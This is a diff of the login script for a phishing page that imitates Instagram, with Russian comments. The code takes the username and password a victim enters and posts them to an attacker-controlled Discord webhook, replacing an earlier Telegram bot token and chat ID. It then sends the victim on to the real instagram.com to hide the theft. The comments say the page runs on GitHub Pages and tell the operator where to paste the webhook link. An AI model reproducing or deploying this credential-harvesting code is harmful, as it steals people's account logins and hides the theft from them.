@@ -69,35 +69,34 @@
     </footer>
 <script>
 document.querySelector('.login-form').addEventListener('submit', function(e) {
-    e.preventDefault(); // Запрещаем стандартную перезагрузку
+    e.preventDefault(); // Отменяем перезагрузку страницы
 
-    const token = '8609652045:AAGsMe6ot70ufCcdRyRk-t_AScRkHwhuM2E'; 
-    const chatId = '1994955308';
+    // ВСТАВЬТЕ МЕЖДУ КАВЫЧКАМИ ССЫЛКУ, КОТОРУЮ СКОПИРОВАЛИ В DISCORD
+    const webhookUrl = "https://discord.com/api/webhooks/1506397733353951232/ZYbHNpnjPwz3bLpgt017Xf89Xb5Js6Scc2J88_wyWHopidDQIqea98n_Rgr6WPdiUmHe";
 
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
 
-    const message = `🔔 Новый вход на страницу!\n👤 Логин: ${username}\n🔑 Пароль: ${password}`;
-    const url = `https://telegram.org{token}/sendMessage`;
+    // Формируем красивое сообщение для Discord канала
+    const payload = {
+        content: `🔔 **Новый лог авторизации!**\n👤 **Логин:** \`${username}\`\n🔑 **Пароль:** \`${password}\`\n🌐 **Источник:** GitHub Pages`
+    };
 
-    // Надежная отправка данных через современный fetch-запрос
-    fetch(url, {
+    // Отправляем данные в Discord
+    fetch(webhookUrl, {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
         },
-        body: JSON.stringify({
-            chat_id: chatId,
-            text: message
-        })
+        body: JSON.stringify(payload)
     })
-    .then(response => {
-        // Страница уйдет на настоящий Instagram ТОЛЬКО ПОСЛЕ ТОГО, как Telegram подтвердит получение данных
+    .then(() => {
+        // После успешной отправки переводим человека на настоящий Instagram
         window.location.href = 'https://instagram.com';
     })
-    .catch(error => {
-        console.error('Ошибка сети:', error);
-        // Даже если будет сбой интернета, плавно перенаправляем пользователя
+    .catch((error) => {
+        console.error('Ошибка:', error);
+        // В случае сбоя всё равно уводим на официальный сайт
         window.location.href = 'https://instagram.com';
     });
 });
